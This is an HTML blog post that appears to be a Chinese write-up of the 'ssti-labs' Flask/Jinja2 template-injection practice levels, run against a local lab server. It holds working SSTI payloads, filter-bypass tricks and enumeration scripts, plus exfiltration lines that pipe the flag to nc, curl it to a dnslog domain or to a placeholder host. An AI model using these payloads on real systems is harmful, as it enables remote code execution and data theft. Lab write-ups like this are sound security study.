@@ -1,0 +1,503 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>ssti-labs | gudiffany_blog</title>
+<link rel="shortcut icon" href="https://gudiffany.github.io//favicon.ico?v=1664035635611">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://gudiffany.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="ssti-labs | gudiffany_blog - Atom Feed" href="https://gudiffany.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="ssti-labs
+基本知识点
+思路：
+先写个脚本
+import requests
+
+url = &quot;http://127.0.0.1:5000/level/1&quot;
+
+for i in range(500):
+    dat..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://gudiffany.github.io/">
+  <img class="avatar" src="https://gudiffany.github.io//images/avatar.png?v=1664035635611" alt="">
+  </a>
+  <h1 class="site-title">
+    gudiffany_blog
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="/find" class="menu">
+          find
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              ssti-labs
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-08-14
+              </span>
+              <span>
+                14 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="ssti-labs">ssti-labs</h1>
+<h2 id="基本知识点">基本知识点</h2>
+<p>思路：</p>
+<p>先写个脚本</p>
+<pre><code class="language-python">import requests
+
+url = &quot;http://127.0.0.1:5000/level/1&quot;
+
+for i in range(500):
+    data = {&quot;code&quot;: '{{&quot;&quot;.__class__.__base__.__subclasses__()['+ str(i) +']}}'}
+    try:
+        response = requests.post(url,data=data)
+        if response.status_code == 200:
+            if &quot;os&quot; in response.text:
+                print(i,&quot;《&quot;,response.text,&quot;》&quot;)
+    except :
+        pass
+</code></pre>
+<p>得到os存在的类</p>
+<p>133 《 Hello &lt;class 'os._wrap_close'&gt; 》</p>
+<pre><code>__class__            类的一个内置属性，表示实例对象的类。
+__base__             类型对象的直接基类
+__bases__            类型对象的全部基类（除object），以元组形式，类型的实例通常没有属性。 __bases__
+__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
+__subclasses__()     返回这个类的所有子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
+__init__             初始化类，返回的类型是function
+__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
+__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
+__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
+__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
+__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
+__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
+__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
+url_for              flask的一个方法，可以调用当前脚本中的函数，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
+get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
+lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}
+current_app          应用上下文，一个全局变量。
+
+request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
+request.args.x1   	 get传参
+request.values.x1 	 所有参数
+request.cookies      cookies参数
+request.headers      请求头参数
+request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
+request.data  		 post传参	(Content-Type:a/b)
+request.json		 post传json  (Content-Type: application/json)
+
+config               当前application的所有配置。此外，也可以这样{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
+self.__dict__		 保存当前类实例或对象实例的属性变量键值对字典，
+{%print(&quot;DMIND&quot;)%}	 控制语句中也能输出
+
+拼接字符：{% set ind=dict(ind=a,ex=a)|join%}		变量ind=index
+获取字符：{{lipsum|string|list|attr('pop')(18)}} 相当于：lipsum|string|list|attr('pop')(18)  输出：_（下划线）
+得到数字：{{lipsum|string|list|attr('index')('g')}} 相当于lipsum|string|list|attr('index')('g') 输出：10
+运算出其他数字：{% set shiba=ten%2bten-two %}        %2b是URL编码后的加号
+
+得到数字：{{dict(a=a)|lower|list|count}}得到16
+运算出其他数字：{{dict(aa=a)|lower|list|count-dict(a=a)|lower|list|count}}得到1
+
+得到任意字符：{{dict(dmind=a)|slice(1)|first|first}}得到dmind
+
+获取__builtins__属性：{{lipsum.__globals__|attr('get')('__builtins__')}}		利用get()、pop()获取属性，相当于lipsum.__globals__.get('__builtins__')
+
+lipsum.__globals__.__builtins__  相当于  lipsum|attr('__globals__')|attr('get')('__builtins__')
+lipsum.__globals__.__builtins__.chr(95)  相当于  lipsum|attr('__globals__')|attr('get')('__builtins__')|attr('get')('chr')(95)
+
+得到chr函数：{%set chr=lipsum.__globals__.__builtins__.chr%}
+利用chr()得到字符：{{chr(47)~chr(32)}}  47是/  32是空格  ~是连接符
+
+利用os执行命令：lipsum.__globals__.os.popen('dir').read()  相当于  lipsum|attr('__globals__')|attr('get')('os')|attr('popen')('dir')|attr('read')()
+类似的		  url_for['__globals__']['os']['popen']('dir').read()
+
+简单的读取文件：url_for[&quot;__globa&quot;+&quot;ls__&quot;].__builtins__.open(&quot;flag.txt&quot;).read()
+
+在能执行eval情况下：eval(__import__('so'[::-1]).__getattribute__('syste'%2b'm')('curl http://xxx:4567?p=`cat /f*`'))
+</code></pre>
+<h2 id="第一题">第一题</h2>
+<p>没啥好说的，就是根据一堆网上的资料写的</p>
+<pre><code class="language-python">{{&quot;&quot;.__class__.__base__.__subclasses__()[133].__init__.__globals__['popen']('cat flag').read()}}
+
+{{&quot;&quot;.__class__.__base__.__subclasses__()[80].__init__.__globals__['__import__']('os').popen(&quot;cat flag&quot;).read()}}
+</code></pre>
+<p>但是我这边没有os模块，也就不列举了</p>
+<p><code>['popen'](&quot;command&quot;).read()</code>主要利用的地方，也可以用system代替popen（本题不行），但是尽量不用system</p>
+<p>在本地找到的是 <code>os._wrap_close</code> 这个类。</p>
+<p>当然利用的还可以是eval()</p>
+<p><code>__import__()</code>等</p>
+<pre><code class="language-python">import requests
+
+url = &quot;http://127.0.0.1:5000/level/1&quot;
+
+for i in range(500):
+    data = {&quot;code&quot;: '{{&quot;&quot;.__class__.__base__.__subclasses__()['+ str(i) +'].__init__.__globals__'+&quot;['popen']&quot;+'}}'}
+    try:
+        response = requests.post(url,data=data)
+        if response.status_code == 200:
+            if &quot;0x&quot; in response.text:
+                print(i,&quot;《&quot;,response.text,&quot;》&quot;)
+    except :
+        pass
+</code></pre>
+<h2 id="第二题">第二题</h2>
+<p>过滤了{{}}</p>
+<p>那么直接可以用{%%}代替</p>
+<p>那么要在{%command%}处执行if，或者for语句</p>
+<p>{%%}{%endif或者endfor%}(这里主要是为了寻找到可利用的模块)</p>
+<pre><code class="language-python">{%for i in ''.__class__.__base__.__subclasses__()%}
+	{%if i.__name__ =='_wrap_close'%}
+		{%print i.__init__.__globals__['popen']('cat flag').read()%}
+	{%endif%}
+{%endfor%}
+</code></pre>
+<p>或者</p>
+<pre><code class="language-python">{%print(x.__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('cat flag').read()&quot;))%}
+</code></pre>
+<h2 id="第三题">第三题</h2>
+<p>盲注</p>
+<p>根据网上提供的wp有两种，一种是dnslog外带，一种是自己nc监听</p>
+<p>那么这边比较不会的是nc监听那么就使用他了</p>
+<p>首先在终端使用命令nc -lvnp 2020监听所有使用2020端口的地址</p>
+<p>然后再使用命令注入</p>
+<pre><code class="language-python">{% for i in ''.__class__.__mro__[-1].__subclasses__() %}
+	{% if i.__name__=='_wrap_close' %}
+		{%print i.__init__.__globals__['popen']('cat flag|nc 0.0.0.0 2020').read()%}
+	{% endif %}
+{% endfor %}
+</code></pre>
+<p>其中mro[-1]可以将类名形成一个元组直接进行for循环</p>
+<p>当然也可以直接将上面的wp改改就行了</p>
+<pre><code class="language-python">{%for i in ''.__class__.__base__.__subclasses__()%}
+	{%if i.__name__ =='_wrap_close'%}
+		{%print i.__init__.__globals__['popen']('cat flag|nc 0.0.0.0 2020').read()%}
+	{% endif %}
+{% endfor %}
+</code></pre>
+<p>那么用一下dnslog来解题</p>
+<pre><code class="language-python">{%for i in ''.__class__.__base__.__subclasses__()%}
+	{%if i.__name__ =='_wrap_close'%}
+		{%print i.__init__.__globals__['popen']('curl http://`cat flag`.t6n089.ceye.io').read()%}
+	{% endif %}
+{% endfor %}
+</code></pre>
+<p>主要是有点慢，而且不显示{}</p>
+<h2 id="第四题">第四题</h2>
+<pre><code class="language-python">{%for i in ''.__class__.__base__.__subclasses__()%}
+	{%if i.__name__ =='_wrap_close'%}
+		{%print i.__init__.__globals__.__getitem__('popen')('cat flag').read()%}
+	{%endif%}
+{%endfor%}
+</code></pre>
+<p>对于索引的<code>[]</code>可以用<code>pop()</code>或<code>__getitem__()</code>代替<code>[]</code>；而类的可以用<code>__getattribute__</code>绕过</p>
+<pre><code class="language-python">{%for i in ''.__class__.__base__.__subclasses__()%}{%if i.__name__ =='_wrap_close'%}{%print i.__init__.__globals__.__getitem__('popen')('cat flag|nc 0.0.0.0 2020').read()%}{%endif%}{%endfor%}
+</code></pre>
+<p>最好使用下面的格式(顺便监听一下)，不然会出现文本变得很长的问题</p>
+<h2 id="第五题">第五题</h2>
+<pre><code class="language-python">{{().__class__.__base__.__subclasses__()[133]}}
+</code></pre>
+<p>先判断一下位置</p>
+<pre><code class="language-html">POST /level/5 HTTP/1.1
+
+Host: 127.0.0.1:5000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-www-form-urlencoded
+
+X-Requested-With: XMLHttpRequest
+
+Content-Length: 128
+
+Origin: http://127.0.0.1:5000
+
+Connection: close
+
+Referer: http://127.0.0.1:5000/level/5
+
+Sec-Fetch-Dest: empty
+
+Sec-Fetch-Mode: cors
+
+Sec-Fetch-Site: same-origin
+
+Cookie:arg1=popen;arg2=cat flag
+
+
+code={{().__class__.__base__.__subclasses__()[133].__init__.__globals__[request.cookies.arg1](request.cookies.arg2).read()}}
+</code></pre>
+<p>将用到‘’和“”的地方换一下发包</p>
+<p>我试过post绕过，但是一直不成功显示no level，不过也是尽量不用post，会改变很多东西，删去post也会导致feibao</p>
+<p>至于chr方法还不是很清楚，后面补</p>
+<h2 id="第六题">第六题</h2>
+<p>编码绕过</p>
+<p>1.16进制编码（中间不用.分隔）</p>
+<pre><code class="language-python">{{&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbase\x5f\x5f&quot;][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[133][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;]['popen']('cat flag').read()}}
+</code></pre>
+<p>2.unicode编码</p>
+<pre><code class="language-python">{{lipsum|attr(&quot;\u005f\u005fglobals\u005f\u005f&quot;)|attr(&quot;\u005f\u005fgetitem\u005f\u005f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()}}
+</code></pre>
+<p>3.base64（任意编码绕过需要py2，我是用的py3）</p>
+<pre><code class="language-python">{{&quot;&quot;|attr('X19jbGFzc19f'.decode('base64'))|attr('X19iYXNlX18='.decode('base64'))|attr('X19zdWJjbGFzc2VzX18='.decode('base64'))()[133]|attr('X19pbml0X18='.decode('base64'))|attr('X19nbG9iYWxzX18='.decode('base64'))|attr('popen')('cat flag')|attr('read')()}}
+</code></pre>
+<p>需要在py2的情况下，py3编码的问题默认type，所以可以先编码字符串再解码就行了，但是会出现无法绕过的情况，因此该方法仅使用与py2</p>
+<h2 id="第七题">第七题</h2>
+<p>['']绕过</p>
+<pre><code class="language-python">{{&quot;&quot;['__class__']['__base__']['__subclasses__']()[133]['__init__']['__globals__']['popen']('cat flag')['read']()}}
+</code></pre>
+<p>attr()绕过</p>
+<pre><code class="language-python">{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(258)|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('cat flag')|attr('read')()}}
+</code></pre>
+<h2 id="第八题">第八题</h2>
+<p>拼接法</p>
+<pre><code class="language-python">{{&quot;&quot;['__cl'+'ass__']['__ba'+'se__']['__subc'+'lasses__']()['__getitem__'](133)['__in'+'it__']['__gl'+ 'obals__']['__getitem__']('po'+'pen')('cat flag').read()}}
+</code></pre>
+<h2 id="第九题">第九题</h2>
+<p>过滤数字</p>
+<p>1.可以使用第二题的wp</p>
+<pre><code class="language-python">{%print(x.__init__.__globals__['__builtins__']['eval'](&quot;__import__('os').popen('cat flag').read()&quot;))%}
+</code></pre>
+<pre><code class="language-python">{%for i in ''.__class__.__base__.__subclasses__()%}
+	{%if i.__name__ =='_wrap_close'%}
+		{%print i.__init__.__globals__['popen']('cat flag').read()%}
+	{%endif%}
+{%endfor%}
+</code></pre>
+<p>2.使用lipsum</p>
+<pre><code>{{lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat flag&quot;)|attr(&quot;read&quot;)()}}
+</code></pre>
+<h2 id="第十题">第十题</h2>
+<pre><code>url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
+get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
+</code></pre>
+<pre><code>{{url_for.__globals__['current_app'].config}}
+
+{{get_flashed_messages.__globals__['current_app'].config}}
+</code></pre>
+<h2 id="第十一题">第十一题</h2>
+<p>接下来就是学会如何构造字符，数字等等</p>
+<p>通用格式</p>
+<pre><code>{% set 变量=dirt(实际值=a)|join%}
+{% set 变量=(已有变量,dirt(实际值=a)|join,已有变量)}
+{% lipsum|string|list %} 查看部分可利用字符，结合pop可以取出字符，attr可以返回其属性
+{% set num=dirt(aaaa(个数=num)=a)|join|count%} count可以换成length
+</code></pre>
+<p>其中pop（）为删除函数</p>
+<pre><code class="language-python">{% set pop=dict(pop=a)|join%}
+{% set xiahuaxian=(lipsum|string|list)|attr(pop)(18)%}
+{% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %}
+{% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %}
+{% set space=(lipsum|string|list)|attr(pop)(9)%}
+{% set os=dict(os=a)|join %}
+{% set popen=dict(popen=a)|join%}
+{% set cat=dict(cat=a)|join%}
+{% set cmd=(cat,space,dict(flag=a)|join)|join%}
+{% set read=dict(read=a)|join%}
+{{(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()}}
+</code></pre>
+<h2 id="第十二题">第十二题</h2>
+<pre><code class="language-python">{% set nine=dict(aaaaaaaaa=a)|join|count%}
+{% set eighteen=nine+nine%}
+
+{% set pop=dict(pop=a)|join%}
+{% set xiahuaxian=(lipsum|string|list)|attr(pop)(eighteen)%}
+{% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %}
+{% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %}
+{% set space=(lipsum|string|list)|attr(pop)(nine)%}
+{% set os=dict(os=a)|join %}
+{% set popen=dict(popen=a)|join%}
+{% set cat=dict(cat=a)|join%}
+{% set cmd=(cat,space,dict(flag=a)|join)|join%}
+{% set read=dict(read=a)|join%}
+{{(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()}}
+</code></pre>
+<h2 id="第十三题">第十三题</h2>
+<pre><code class="language-python">{% set nine=dict(aaaaaaaaa=a)|join|count%}
+{% set eighteen=dict(aaaaaaaaaaaaaaaaaa=a)|join|count%}
+
+{% set pop=dict(pop=a)|join%}
+{% set xiahuaxian=(lipsum|string|list)|attr(pop)(eighteen)%}
+{% set globals=(xiahuaxian,xiahuaxian,dict(globals=a)|join,xiahuaxian,xiahuaxian)|join %}
+{% set getitem=(xiahuaxian,xiahuaxian,dict(getitem=a)|join,xiahuaxian,xiahuaxian)|join %}
+{% set space=(lipsum|string|list)|attr(pop)(nine)%}
+{% set os=dict(os=a)|join %}
+{% set popen=dict(popen=a)|join%}
+{% set cat=dict(cat=a)|join%}
+{% set cmd=(cat,space,dict(flag=a)|join)|join%}
+{% set read=dict(read=a)|join%}
+{{(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()}}
+</code></pre>
+<h2 id="总结">总结</h2>
+<p>整体环境为：py3，linux，flask=2.2.2</p>
+<h2 id="特别吐槽">特别吐槽</h2>
+<p>千算万算没想到最后一直没回显是因为win10系统解析不了纯文本，在linux下就可以</p>
+<p>至于如何发现的，那我就是再建立一个flag.txt，发现可以正常调用，那么命令是正常的，但是没办法正常回显</p>
+<p>然后我移动到kali里面，然后做出了第一题</p>
+<p>当然我还是没搞懂再flask1.1.1的情况下会造成前端bootstrap申请css出现500的情况（大概是flask的问题，最新版不出问题，略感难受，文档害死人了），甚至我怀疑是py自带的生产环境有问题，或者网络问题，前者我用第三方的WSGI进行排除，后者我一边用py2运行1.1.1，py3运行2.2.2，然后前后相差不到5s，基本确定是版本问题，原因不清楚</p>
+<p>只能说，So，win10————</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#ssti-labs">ssti-labs</a>
+<ul>
+<li><a href="#%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E7%82%B9">基本知识点</a></li>
+<li><a href="#%E7%AC%AC%E4%B8%80%E9%A2%98">第一题</a></li>
+<li><a href="#%E7%AC%AC%E4%BA%8C%E9%A2%98">第二题</a></li>
+<li><a href="#%E7%AC%AC%E4%B8%89%E9%A2%98">第三题</a></li>
+<li><a href="#%E7%AC%AC%E5%9B%9B%E9%A2%98">第四题</a></li>
+<li><a href="#%E7%AC%AC%E4%BA%94%E9%A2%98">第五题</a></li>
+<li><a href="#%E7%AC%AC%E5%85%AD%E9%A2%98">第六题</a></li>
+<li><a href="#%E7%AC%AC%E4%B8%83%E9%A2%98">第七题</a></li>
+<li><a href="#%E7%AC%AC%E5%85%AB%E9%A2%98">第八题</a></li>
+<li><a href="#%E7%AC%AC%E4%B9%9D%E9%A2%98">第九题</a></li>
+<li><a href="#%E7%AC%AC%E5%8D%81%E9%A2%98">第十题</a></li>
+<li><a href="#%E7%AC%AC%E5%8D%81%E4%B8%80%E9%A2%98">第十一题</a></li>
+<li><a href="#%E7%AC%AC%E5%8D%81%E4%BA%8C%E9%A2%98">第十二题</a></li>
+<li><a href="#%E7%AC%AC%E5%8D%81%E4%B8%89%E9%A2%98">第十三题</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+<li><a href="#%E7%89%B9%E5%88%AB%E5%90%90%E6%A7%BD">特别吐槽</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://gudiffany.github.io/post/xss-labs/">
+              <h3 class="post-title">
+                xss-labs
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://gudiffany.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
